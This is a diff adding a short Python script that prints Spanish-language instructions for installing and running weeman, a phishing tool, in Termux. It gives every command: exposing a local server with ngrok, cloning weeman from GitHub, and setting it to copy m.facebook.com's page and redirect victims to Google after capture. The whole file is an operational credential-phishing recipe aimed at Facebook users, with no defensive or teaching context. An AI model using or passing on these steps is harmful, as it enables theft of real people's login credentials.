@@ -1,0 +1,46 @@
+print("""
+\033[1;31m¿Qué es weeman?
+
+\033[1;39mweeman es una herramienta que copia el código html de una página web a tu elección, y crea un enlace phishing con dichos datos.
+
+\033[1;33mINSTALACIÓN DE weeman EN TERMUX
+
+\033[1;36mEJECUTAR UNA SESIÓN DE ngrok
+
+\033[1;39m./ngrok http 3333
+
+\033[1;33mABRIR UNA NUEVA SESIÓN EN TERMUX...
+
+\033[1;39mapt update && apt upgrade -y
+
+termux-setup-storage
+
+pkg install -y python
+
+pkg install -y python2
+
+pkg install -y git
+
+git clone https://github.com/evait-security/weeman
+
+cd weeman
+
+chmod 777 weeman.py
+
+python2 weeman.py
+
+show options
+
+set url https://m.facebook.com
+[Página a clonar]
+
+set port 3333
+[Puerto usado en ngrok]
+
+set action_url https://www.google.com
+[Página de redirección]
+
+run
+[Comenzar]
+""")
+
